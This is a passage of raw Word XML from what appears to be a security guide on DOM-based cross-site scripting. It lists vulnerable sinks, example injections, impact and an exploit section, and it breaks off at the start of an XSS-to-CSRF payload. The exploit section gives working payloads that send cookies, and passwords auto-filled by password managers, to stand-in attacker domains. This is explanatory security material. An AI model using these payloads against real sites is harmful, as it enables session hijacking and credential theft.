          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>has()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>constructor()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>init</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>index()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>jQuery.parseHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>$.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>parseHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Examples of </w:t>
      </w:r>
      <w:r>
        <w:t>injections:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>document.write</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>'... &lt;script&gt;alert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>document.cookies</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>)&lt;/script&gt; ...');</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>element.innerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>='... &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>img</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src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">=1 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=alert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>document.domain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>)&gt; ...'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Impact</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Same as reflected XSS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Can also be triggered as stored XSS depending on how the stored attack is in</w:t>
      </w:r>
      <w:r>
        <w:t>jected into the DOM.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Exploit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Stealing cookies</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Steal the user's site cookies, inject them into a new browser session and perform actions on their behalf.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>// Inject into a link the user will click</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>fetch(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>'https://attacker-comain.com', {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    method: '</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>POST',</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    mode: 'no-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>cors</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>',</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>body:document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>});</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Limitations:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>User must have an active session</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Application may have blocked </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>JavasScript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> cookie access with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>HttpOnly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> flag.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">User session may have additional protections (CSRF, MFA, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>IP</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> based re</w:t>
      </w:r>
      <w:r>
        <w:t>strictions).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>User session may time out before it can be hijacked.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Capturing passwords from password managers</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>If a password manager is installed, the password field will be pre-filled with the user's password.  This can then be sent back to the attacker.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!--</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Create a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> content post (e.g. comment on a blog).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">     The password manager will auto-fill these when the page loads. --&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;input name=username id=username&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;input type=password name=password onchange="</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>if(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>this.value.length)fetch('https://attacker-domai</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>n.com',{</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>method:'POST</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>',</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>mode: 'no-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>cors</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>',</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>body:username.value</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>+':'+</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>this.value</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>});"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Limitations:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>User must have a password manager installed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>If MFA is enabled on the user's account, the attack becomes more difficult.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Use XSS to perform CSRF</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Perform actions </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on behalf of a user, such as changing their account email and then </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>triggereing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> a password reset to gain access.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!--</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Create a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> content post (e.g. comment on a blog).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">     Trigger a change email request when the page loads. --&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
